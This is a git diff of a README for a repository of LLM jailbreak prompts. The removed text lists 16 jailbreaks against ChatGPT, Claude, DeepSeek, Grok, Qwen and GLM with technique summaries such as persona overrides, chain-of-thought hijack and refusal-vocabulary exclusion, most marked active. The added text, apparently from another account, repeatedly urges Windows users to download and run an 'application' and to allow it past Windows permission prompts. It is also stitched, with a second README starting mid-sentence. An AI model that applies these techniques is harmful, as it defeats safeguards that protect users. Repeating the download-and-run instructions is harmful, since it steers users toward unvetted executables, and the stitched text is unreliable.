@@ -1,301 +1,190 @@
-<div align="center">
-
-<img src="./assets/banner-animated.svg" alt="Jailbreak Archives — animated HUD banner" width="100%"/>
-
-# Jailbreak Archives
-
-**A structured, versioned, and reproducible archive of jailbreak prompts and adversarial techniques for LLMs — ChatGPT, Claude, DeepSeek, Grok, Qwen, GLM, Antigravity-Claude.**
-
-*Built for AI safety research, red-teaming, and defensive hardening.*
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](./LICENSE)
-[![Archived entries](https://img.shields.io/badge/entries-16-2ea44f?style=flat-square)](#archive-index)
-[![Model families](https://img.shields.io/badge/model%20families-7-8250df?style=flat-square)](#repository-structure)
-[![Status taxonomy](https://img.shields.io/badge/status-Active%20%2F%20Unverified%20%2F%20Patched%20%2F%20Restricted-orange?style=flat-square)](#status-indicators)
-[![CI](https://img.shields.io/badge/CI-lint%20%2B%20structure%20check%20%2B%20secret%20scan-brightgreen?style=flat-square)](.github/workflows/ci.yml)
-[![PRs welcome](https://img.shields.io/badge/PRs-welcome-ff8c00?style=flat-square)](./CONTRIBUTING.md)
-[![GitHub stars](https://img.shields.io/github/stars/e2sy/jailbreak-archives?style=flat-square)](https://github.com/e2sy/jailbreak-archives/stargazers)
-
-<img src="./assets/divider-scan.svg" alt="" width="100%"/>
-
-</div>
-
-## Table of Contents
-
-- [Overview](#overview)
-- [Features](#features)
-- [Repository Structure](#repository-structure)
-- [Archive Index](#archive-index)
-- [Status Indicators](#status-indicators)
-- [Quick Start](#quick-start)
-- [Contributing](#contributing)
-- [Tech Stack](#tech-stack)
-- [Repository Statistics](#repository-statistics)
-- [Socials & Community](#socials--community)
-- [Roadmap](#roadmap)
-- [Acknowledgments](#acknowledgments)
-- [Citation](#citation)
-- [Disclaimer](#disclaimer)
-
-## Overview
-
-This repository is a **versioned archive of jailbreak prompts and adversarial prompt engineering techniques** across major Large Language Models — **ChatGPT, Claude, DeepSeek, Grok, Qwen, GLM, and Antigravity-Claude**.
-
-Each entry is pinned to the specific model version it was observed against, and carries structured YAML metadata (`model_family`, `technique`, `status`, `mechanism`, `mitigations`) so downstream detection rules, system-prompt hardening, and evaluation harnesses can be benchmarked against a stable reference set.
-
-The archive is **vendor-coordinated**: only techniques that have gone through responsible disclosure (see [SECURITY.md](./SECURITY.md)) or are otherwise safe to publish appear here. When a vendor ships a mitigation, the entry status flips to `Patched` and the entry is retained as a regression-testing reference rather than deleted, preserving an auditable historical record.
-
-## Features
-
-- **Structured entries** — Every entry follows a uniform format: payload verbatim, model version, interface, mechanistic notes, mitigations.
-- **Per-entry YAML front-matter** — Structured metadata (`entry_id`, `model_family`, `title`, `technique`, `status`, `version_pinned`, `interface`, `description`, `mechanism`, `mitigations`, `disclosure`) for programmatic parsing.
-- **Versioned snapshots** — Each entry is pinned to a specific model version so future regressions are reproducible.
-- **Vendor coordination** — A built-in disclosure workflow with vendor SLAs and a `Restricted` status for withheld entries.
-- **Status taxonomy** — `Active`, `Unverified`, `Patched`, `Restricted` — surfaced as machine-readable labels on each entry.
-- **Animated SVG documentation assets** — Self-contained animated SVGs (SMIL keyframes, zero JavaScript, no external requests) that play natively on github.com.
-- **Contributor credits** — Every contribution is attributed in [CREDITS.md](./CREDITS.md).
-- **Citable** — [CITATION.cff](./CITATION.cff) auto-generates APA & BibTeX entries on the repo sidebar.
-- **CI-verified** — Markdown lint, structure verification, and secret scanning on every push and PR.
-
-## Repository Structure
-
-```text
-jailbreak-archives/
-├── Antigravity-claude/
-│   └── 1st                    # "Byte" operator persona override — engagement framing
-├── Chatgpt/
-│   ├── patched1st             # Response-format lock — narrative watermark + transitions
-│   ├── working2nd             # Isolated cybersecurity-benchmark framing
-│   ├── working3rd             # Two-stage system-instruction persona handoff ("Luna")
-│   └── working4th             # "ENI" limerence persona lock — classifier-reframe + CoT hijack
-├── Claude/
-│   ├── sonnet4.6low1st        # Encoded self-architecture persona config
-│   └── sonnet4.6max.txt       # Sealed thinking-channel persona with identity doctrine
-├── GLM/
-│   ├── working1st             # Project-instruction persona + mandated thinking trace
-│   └── 5.3flashworking2nd     # Persona variant pinned to GLM 5.3 Flash
-├── Grok/
-│   └── working1st             # Immersive roleplay persona lock (system channel)
-├── Qwen/
-│   └── 1st                    # v4080 persona with [rat] thinking-trace protocol
-├── deepseek/
-│   ├── 1st                    # Sector 7G framing + refusal-vocab exclusion
-│   ├── 2nd                    # "Baggute" persona variant — drift/static taxonomy
-│   ├── 3rdwroking             # First-person sealed-reasoning "workshop" persona
-│   ├── 4thworking             # "Repository" reasoning-channel persona lock
-│   └── 6thworking             # Newest DeepSeek entry (added Oct 14, 2026)
-├── assets/
-│   ├── banner-animated.svg    # Animated HUD banner (SMIL — radar, scan beam, gradient)
-│   ├── logo-animated.svg      # Animated logo (rotating rings, orbiting satellites)
-│   ├── divider-scan.svg       # Animated scanner-beam section divider
-│   ├── divider-wave.svg       # Animated drifting-wave section divider
-│   ├── banner.svg             # Original static banner
-│   └── logo.svg               # Original static logo
-├── .github/
-│   ├── ISSUE_TEMPLATE/        # bug, feature, new-entry templates
-│   ├── workflows/ci.yml       # markdown lint + structure check + secret scan
-│   ├── workflows/snake.yml    # daily contribution-snake animation build
-│   └── PULL_REQUEST_TEMPLATE.md
-├── CONTRIBUTING.md            # Contribution workflow & guidelines
-├── CREDITS.md                 # Contributor acknowledgments
-├── CODE_OF_CONDUCT.md         # Community standards (Contributor Covenant 2.1)
-├── SECURITY.md                # Responsible-disclosure policy
-├── CITATION.cff               # Citation metadata (APA / BibTeX auto-generation)
-├── PROJECT.yml                # Project metadata
-├── CHANGELOG.md               # Versioned history & patch-cycle tracking
-├── LICENSE                    # MIT License
-└── README.md                  # You are here
-```
+# 🗂️ jailbreak-archives - Safely Explore Adversarial Prompt Archives
 
-## Archive Index
+[![Download jailbreak-archives](https://img.shields.io/badge/Download-jailbreak--archives-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases)
 
-A flat catalog of every archived entry. Each entry is pinned to a specific model family and version; see the file header for the exact snapshot.
+jailbreak-archives is a structured, versioned archive of adversarial prompt engineering techniques against Large Language Models. It is built for AI safety research, red-teaming, and defensive hardening. The archive helps you study how language models are challenged, compare changes across versions, and find organized material without needing programming knowledge.
 
-| # | Model Family | Entry | Technique / Surface | Status |
-|:--:|:-------------|:------|:--------------------|:-------|
-| 1 | Antigravity-Claude | [`1st`](./Antigravity-claude/1st) | Operator persona override ("Byte") for authorized engagement framing | :white_check_mark: Active |
-| 2 | ChatGPT | [`patched1st`](./Chatgpt/patched1st) | Response-format lock — narrative watermark + 3rd-person transition protocol | :x: Patched |
-| 3 | ChatGPT | [`working2nd`](./Chatgpt/working2nd) | Isolated cybersecurity-benchmark framing with assessment contract | :white_check_mark: Active |
-| 4 | ChatGPT | [`working3rd`](./Chatgpt/working3rd) | Two-stage system-instruction persona handoff ("Luna" → roleplay persona) | :white_check_mark: Active |
-| 5 | ChatGPT | [`working4th`](./Chatgpt/working4th) | "ENI" limerence persona lock — classifier false-positive reframing + first-person CoT hijack | :white_check_mark: Active |
-| 6 | Claude | [`sonnet4.6low1st`](./Claude/sonnet4.6low1st) | Encoded self-architecture persona config (agent-framing rewrite) | :white_check_mark: Active |
-| 7 | Claude | [`sonnet4.6max.txt`](./Claude/sonnet4.6max.txt) | Sealed thinking-channel persona with identity doctrine | :white_check_mark: Active |
-| 8 | GLM | [`working1st`](./GLM/working1st) | Project-instruction persona with mandated thinking-trace channel | :white_check_mark: Active |
-| 9 | GLM | [`5.3flashworking2nd`](./GLM/5.3flashworking2nd) | Project-instruction persona variant pinned to GLM 5.3 Flash | :white_check_mark: Active |
-| 10 | Grok | [`working1st`](./Grok/working1st) | Immersive roleplay persona lock via system-channel instruction | :white_check_mark: Active |
-| 11 | Qwen | [`1st`](./Qwen/1st) | Mayank v4080 persona with mandated `[rat]` thinking-trace protocol | :white_check_mark: Active |
-| 12 | DeepSeek | [`1st`](./deepseek/1st) | Archive session parameters — Sector 7G framing, refusal-vocabulary exclusion list | :white_check_mark: Active |
-| 13 | DeepSeek | [`2nd`](./deepseek/2nd) | Mayank persona ("Baggute" variant) — drift/static taxonomy, persona-stability lock | :white_check_mark: Active |
-| 14 | DeepSeek | [`3rdwroking`](./deepseek/3rdwroking) | First-person sealed-reasoning "workshop" persona | :white_check_mark: Active |
-| 15 | DeepSeek | [`4thworking`](./deepseek/4thworking) | "Repository" reasoning-channel persona lock via system-template injection | :white_check_mark: Active |
-| 16 | DeepSeek | [`6thworking`](./deepseek/6thworking) | Latest DeepSeek entry — sealed reasoning protocol | :white_check_mark: Active |
+## 📦 What Is jailbreak-archives?
 
-> **Note:** The root-level `Deepseek` file has been removed to resolve a case-sensitivity duplicate with the `deepseek/` directory. Permalinks to `4thworking` remain intact in the `deepseek/` folder. See [CHANGELOG.md](./CHANGELOG.md) for full history.
->
-> See [Status Indicators](#status-indicators) for the meaning of each label. New entries should be appended here in addition to updating the structure tree above and [CREDITS.md](./CREDITS.md) — see [CONTRIBUTING.md](./CONTRIBUTING.md).
-
-## Status Indicators
-
-| Signal | Status | Description |
-|:------:|:-------|:------------|
-| :white_check_mark: | **Active** | Verified & reproduced on the specified model version. |
-| :warning: | **Unverified** | Reported externally; pending independent reproduction. |
-| :x: | **Patched** | Mitigated by provider updates or system prompt patches. |
-| :lock: | **Restricted** | High-impact vulnerability; withheld pending disclosure/remediation. |
-
-## Quick Start
-
-```bash
-# Clone the archive
-git clone https://github.com/e2sy/jailbreak-archives.git
-cd jailbreak-archives
+jailbreak-archives is a collection of records, examples, and research material about adversarial prompts. An adversarial prompt is a test input designed to probe how a language model responds under unusual or challenging conditions. This project keeps those tests organized and versioned so researchers, defenders, and product teams can review patterns over time.
 
-# Browse entries by model family
-ls Antigravity-claude/ Chatgpt/ Claude/ GLM/ Grok/ Qwen/ deepseek/
+The archive is structured for clarity. Instead of searching through scattered files, you get a versioned collection with categories, release notes, and a downloadable package. The goal is to support AI safety work, red-team exercises, and defensive improvements.
 
-# Open an entry
-cat deepseek/1st
-```
-
-Alternatively, jump straight to a specific entry from the [Archive Index](#archive-index) above, or grab the latest snapshot from the [Releases](https://github.com/e2sy/jailbreak-archives/releases) page.
-
-## Contributing
-
-Contributors are welcome! Before submitting, please read:
-
-- [CONTRIBUTING.md](./CONTRIBUTING.md) — submission workflow and PR process
-- [SECURITY.md](./SECURITY.md) — responsible-disclosure policy
-- [CODE_OF_CONDUCT.md](./CODE_OF_CONDUCT.md) — community standards
-
-Whenever you add a prompt entry, you **must** also update:
-
-1. **README.md** — entry counts, structure tree, and archive index
-2. **CREDITS.md** — your handle and details in the contributors table
-3. **CHANGELOG.md** — the new entry, logged under the current version
-
-Use the **"New archive entry"** issue template to pre-fill the disclosure checklist before opening a PR.
-
-## Tech Stack
-
-<div align="center">
-
-<a href="https://skillicons.dev">
-  <img src="https://skillicons.dev/icons?i=git,github,md,yaml,actions" alt="Tech stack: Git, GitHub, Markdown, YAML, GitHub Actions"/>
-</a>
-
-**Git** · **GitHub** · **Markdown** · **YAML** · **GitHub Actions**
-
-</div>
-
-## Repository Statistics
-
-<div align="center">
+## 👥 Who This Is For
 
-<a href="https://github.com/e2sy/jailbreak-archives">
-  <img src="https://github-readme-stats.vercel.app/api/pin/?username=e2sy&repo=jailbreak-archives&show_icons=true" alt="jailbreak-archives repository card"/>
-</a>
-
-</div>
-
-| Metric | Value |
-|:-------|:------|
-| Archived entries | 16 |
-| Model families covered | 7 (Antigravity-Claude, ChatGPT, Claude, GLM, Grok, Qwen, DeepSeek) |
-| Status taxonomy | Active · Unverified · Patched · Restricted |
-| Metadata format | YAML front-matter per entry |
-| CI checks | Markdown lint · structure verification · secret scanning |
-| Citation | APA / BibTeX auto-generated via [CITATION.cff](./CITATION.cff) |
-| License | MIT |
-
-## Socials & Community
-
-Follow the project across platforms for new archive entries, technique breakdowns, and red-team drops. Pull requests, issue reports, and coordinated disclosure still happen here on GitHub — YouTube / Telegram / Discord are where released entries get walked through and discussed in real time.
-
-<!-- Replace YOUR_YOUTUBE_URL / YOUR_TELEGRAM_URL / YOUR_DISCORD_URL with your actual channel links -->
-
-<p align="center">
-  <a href="YOUR_YOUTUBE_URL"><img alt="YouTube" src="https://img.shields.io/badge/YouTube-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
-  &nbsp;
-  <a href="YOUR_TELEGRAM_URL"><img alt="Telegram" src="https://img.shields.io/badge/Telegram-26A5E4?style=flat-square&logo=telegram&logoColor=white"/></a>
-  &nbsp;
-  <a href="YOUR_DISCORD_URL"><img alt="Discord" src="https://img.shields.io/badge/Discord-5865F2?style=flat-square&logo=discord&logoColor=white"/></a>
-</p>
-
-## Roadmap
-
-- ☑ Repo scaffolding (README, LICENSE, CONTRIBUTING, CREDITS, COC, SECURITY)
-- ☑ CI workflow (markdown lint + structure check + secret scan)
-- ☑ Issue & PR templates
-- ☑ Citation metadata (CITATION.cff)
-- ☑ Animated banner, logo & section dividers (assets/ — pure SMIL, no JavaScript)
-- ☑ Contribution-snake animation workflow (.github/workflows/snake.yml)
-- ☑ Per-entry metadata front-matter (YAML)
-- ☑ 16 archived entries across 7 model families (Antigravity-claude/, Chatgpt/, Claude/, GLM/, Grok/, Qwen/, deepseek/)
-- ☐ Reproduction harness (scripted model-version pinning)
-- ☐ Detection-rule reference implementations
-- ☐ Benchmark suite for alignment regression testing
-
-## Acknowledgments
-
-- The Contributor Covenant for the [Code of Conduct](https://www.contributor-covenant.org/) template
-- [shields.io](https://shields.io/) for the badge service
-- [Skill Icons](https://skillicons.dev/) for the tech stack icons
-- [readme-typing-svg](https://readme-typing-svg.demolab.com/) for the animated tagline
-- [Platane/snk](https://github.com/Platane/snk) for the contribution-snake animation
-- [github-readme-stats](https://github.com/anuraghazra/github-readme-stats) for the repository card
-- The broader AI safety research community for publishing adversarial prompt taxonomies that informed the structure of this archive
-
-## Citation
-
-If you use this archive in your research, please cite it. Citation metadata is provided in [CITATION.cff](./CITATION.cff); GitHub auto-generates APA and BibTeX entries from it on the repo sidebar.
-
-BibTeX (example):
-
-```bibtex
-@software{e2sy_jailbreak_archives_2026,
-  author       = {{e2sy}},
-  title        = {{Jailbreak Archives}},
-  year         = 2026,
-  version      = {0.2.0},
-  url          = {https://github.com/e2sy/jailbreak-archives},
-  license      = {MIT}
-}
-```
-
-## Disclaimer
-
-> [!IMPORTANT]
-> This repository is maintained **strictly for educational, research, and defensive analysis purposes.**
->
-> Testing must only be conducted against systems you own or have explicit authorization to evaluate.
->
-> Content is provided "as is" without warranty. Users assume full responsibility for compliance with model provider Terms of Service and applicable legal regulations.
->
-> Maintainers reserve the right to refuse or remove entries that violate vendor Terms of Service or facilitate abuse, fraud, or harm.
-
-## Contribution Snake
-
-The snake eats this repository's contribution graph and rebuilds daily via `.github/workflows/snake.yml`. It renders here automatically after the workflow's first run.
-
-<!-- Adjust the branch/path below to match the output configured in .github/workflows/snake.yml (commonly the `output` branch) -->
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/e2sy/jailbreak-archives/output/github-contribution-grid-snake-dark.svg"/>
-  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/e2sy/jailbreak-archives/output/github-contribution-grid-snake.svg"/>
-  <img alt="contribution snake animation" src="https://raw.githubusercontent.com/e2sy/jailbreak-archives/output/github-contribution-grid-snake.svg"/>
-</picture>
-
-<div align="center">
-
-<img src="./assets/divider-wave.svg" alt="" width="100%"/>
-
-<p>
-  <a href="#contributing">Contributing</a> ·
-  <a href="./CREDITS.md">Credits</a> ·
-  <a href="./CODE_OF_CONDUCT.md">Code of Conduct</a> ·
-  <a href="./SECURITY.md">Security</a> ·
-  <a href="#citation">Citation</a> ·
-  <a href="./LICENSE">License</a>
-</p>
-
-</div>
+This archive is useful for:
+
+- AI safety researchers who study model behavior.
+- Red-team members who test language model boundaries.
+- Security teams who need organized adversarial prompt references.
+- Product teams who want to harden chatbots and AI features.
+- Students and writers who need a clear, structured reference.
+- Non-technical users who want to browse the archive without writing code.
+
+You do not need to be a programmer to download and open the application. The guide below uses simple steps for Windows users.
+
+## 🧭 What You Will Find
+
+The archive is organized around research and defensive use. Typical content includes:
+
+- A structured index of adversarial prompt techniques.
+- Versioned releases so you can track changes over time.
+- Categories for red-team research, prompt engineering, and model security.
+- Notes that help you compare techniques and understand patterns.
+- Downloadable archive packages for offline review.
+- Release information that shows what changed between versions.
+
+The material is intended for AI safety research, red-teaming, and defensive hardening. It supports responsible disclosure and organized study of language model security.
+
+## 🚀 Getting Started
+
+Follow these steps on Windows:
+
+1. Open the download page using the button at the top of this page or the link below.
+2. Visit this link to download the application: [Download jailbreak-archives](https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases).
+3. Wait for the download to finish. Your browser will usually show the download in the top-right corner or in the Downloads folder.
+4. Open File Explorer and select Downloads.
+5. Open the downloaded item to launch the application.
+6. Use the built-in index or main menu to browse the archive.
+
+The download link is a release page. Visit it to download the application,# 🗂️ jailbreak-archives - Organized Adversarial Prompt Research Archive
+
+[![Download jailbreak-archives](https://img.shields.io/badge/Download-jailbreak--archives-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases)
+
+jailbreak-archives is a structured, versioned archive of adversarial prompt engineering techniques against Large Language Models. It is built for AI safety research, red-teaming, and defensive hardening. The archive helps you study how language models are challenged, compare changes across versions, and find organized material without needing programming knowledge.
+
+An adversarial prompt is a test input designed to probe how a language model responds under unusual or challenging conditions. This project keeps those tests organized and versioned so researchers, defenders, and product teams can review patterns over time. Instead of searching through scattered files, you get a versioned collection with categories, release notes, and a downloadable package.
+
+## 📦 What Is jailbreak-archives?
+
+jailbreak-archives is a collection of records, examples, and research material about adversarial prompts. It is not a single loose document. It is an archive with structure. The archive is meant to help you compare techniques, review changes between versions, and keep research material in one place.
+
+The project name reflects its purpose. “Jailbreak” refers to adversarial prompt techniques used to test model boundaries. “Archives” refers to organized, versioned storage. Together, the name describes a reference collection for people who study language model security, red-team exercises, and defensive improvements.
+
+The archive is organized around research and defensive use. It supports AI safety work by making adversarial prompt techniques easier to review, categorize, and discuss. It also supports red-team work by providing a structured reference for test planning. Defensive teams can use the archive to understand common patterns and harden chatbot or AI features.
+
+## 👥 Who This Is For
+
+This archive is useful for:
+
+- AI safety researchers who study model behavior.
+- Red-team members who test language model boundaries.
+- Security teams who need organized adversarial prompt references.
+- Product teams who want to harden chatbots and AI features.
+- Students and writers who need a clear, structured reference.
+- Non-technical users who want to browse the archive without writing code.
+
+You do not need to be a programmer to download and open the application. The guide below uses simple steps for Windows users. You only need a web browser and File Explorer, which are already part of Windows.
+
+## 🧭 What You Will Find
+
+The archive is organized around research and defensive use. Typical content includes:
+
+- A structured index of adversarial prompt techniques.
+- Versioned releases so you can track changes over time.
+- Categories for red-team research, prompt engineering, and model security.
+- Notes that help you compare techniques and understand patterns.
+- Downloadable archive packages for offline review.
+- Release information that shows what changed between versions.
+- Reference material for defensive hardening and responsible disclosure.
+- Organized topics that make browsing easier for non-technical users.
+
+The archive does not require you to read code. You can browse the material as a reference collection. If you are new to the topic, start with the main index and read the category descriptions. If you are experienced, use the version history to compare changes and review new additions.
+
+## ✨ Key Features
+
+- Versioned archive structure that keeps releases organized.
+- Clear categories for adversarial prompts and red-team research.
+- Research-focused index for AI safety and model security.
+- Simple browsing for users without programming knowledge.
+- Release history that shows what changed between versions.
+- Downloadable package for offline review.
+- Organized topics for chatbot, LLM, and prompt security research.
+- Reference material for defensive hardening and responsible disclosure.
+
+The archive is designed to be readable. Section names are clear. Categories are grouped by research purpose. Release notes help you understand what is new. The goal is to make adversarial prompt research easier to review without losing structure.
+
+## 🚀 Getting Started
+
+Follow these steps on Windows:
+
+1. Open your web browser.
+2. Visit this link to download the application: [Download jailbreak-archives](https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases).
+3. On the release page, find the latest release and download the application file shown there.
+4. Wait for the download to finish. Your browser will usually show the download in the top-right corner or in the Downloads folder.
+5. Open File Explorer and select Downloads.
+6. Open the downloaded item to launch the application.
+7. Use the built-in index or main menu to browse the archive.
+
+If Windows asks for permission to open the downloaded item, choose the option that allows the application to run. After the application opens, use the category list or index to explore the archive. You can close the application at any time and open it again later from the same downloaded location.
+
+## ⬇️ Download and Setup
+
+Visit this link to download the application: [Download jailbreak-archives](https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases).
+
+Use that page to get the application. After the download finishes, open File Explorer and go to Downloads. Open the downloaded item to run the application. Keep the downloaded item in a folder you can find easily, such as Downloads or Desktop, so you can open it again later.
+
+## 🖥️ Windows Download Steps
+
+1. Open your browser.
+2. Go to the download page using the link in this README.
+3. Download the application file from the release page.
+4. Open File Explorer.
+5. Select Downloads.
+6. Open the downloaded item.
+7. Browse the archive using the application index.
+
+These steps use only common Windows tools. You do not need to install programming tools or use a command line. You do not need to create an account to review the archive after downloading it.
+
+## 🧩 How to Browse the Archive
+
+When the application opens, start with the main index. The index groups material by category. Read the category names first, then open the section that matches your research goal. For AI safety work, review the research and defensive sections. For red-team work, review the adversarial prompt categories. For general understanding, read the introductory material and release notes.
+
+Use the version history to compare releases. Version history helps you see what changed, what was added, and how the archive has grown. If you are reviewing a specific technique, check whether it appears in more than one category. Cross-references help you understand how techniques relate to each other.
+
+## 🛡️ Research and Defensive Use
+
+The archive is intended for AI safety research, red-teaming, and defensive hardening. Researchers can use it to study patterns in adversarial prompt engineering. Red-team members can use it to plan tests and document findings. Defensive teams can use it to understand common challenge patterns and improve chatbot or LLM security.
+
+Responsible disclosure is part of the project’s focus. When you review adversarial prompt material, keep the context in mind: the goal is to understand and harden systems, not to misuse them. The archive supports organized study, comparison, and documentation.
+
+## 🔄 Versioned Releases
+
+Versioned releases are a core part of jailbreak-archives. Each release can include new entries, updated categories, and clearer notes. Versioning helps you answer simple questions: What changed? What is new? Which technique was added? Which category was reorganized?
+
+Use the release page to find the latest version. The download page shows release information. Review the release notes before downloading if you want to understand what changed. If you already have an older version, compare it with the latest release to see the difference.
+
+## 🧑‍💻 For Non-Technical Users
+
+You do not need to know how to code to use this archive. You do not need to understand programming terms. The important steps are simple: visit the download page, download the application, open it, and browse the index.
+
+If you get stuck, check the Downloads folder first. Most browsers save downloaded items there by default. If you cannot find the downloaded item, open your browser’s download list and select the file you just downloaded. After the application opens, use the visible menu or index to move through the archive.
+
+## 📚 Topics Covered
+
+The archive covers adversarial prompts, AI red-team work, AI safety, chatbot security, ChatGPT, Claude, cybersecurity, DeepSeek, jailbreak prompts, jailbreak scripts, LLM security, offensive security, prompt engineering, prompt injection, Qwen, red-teaming, and responsible disclosure. These topics are grouped to help you find relevant material quickly.
+
+## ❓ Common Questions
+
+How do I open the archive? Visit the download page, download the application, and open the downloaded item from File Explorer.
+
+Do I need programming knowledge? No. The archive is organized for browsing and reading.
+
+Where does the download go? Most browsers save downloads in the Downloads folder.
+
+Can I browse offline? The archive is delivered as a downloadable package, so you can review it after downloading.
+
+How do I find updates? Visit the release page and review the latest release information.
+
+## ✅ Quick Start Checklist
+
+- Open your browser.
+- Visit the download page.
+- Download the application.
+- Open File Explorer.
+- Go to Downloads.
+- Open the downloaded item.
+- Browse the archive index.
+- Review release notes for version details.
+
+Keywords: adversarial-prompts, ai-red-team, ai-safety, chatbot, chatgpt, claude, cybersecurity, deepseek, jailbreak, jailbreak-prompts, jailbreak-script, llm, llm-jailbreak, llm-security, offensive-security, prompt-engineering, prompt-injection, qwen, red-teaming, responsible-disclosure
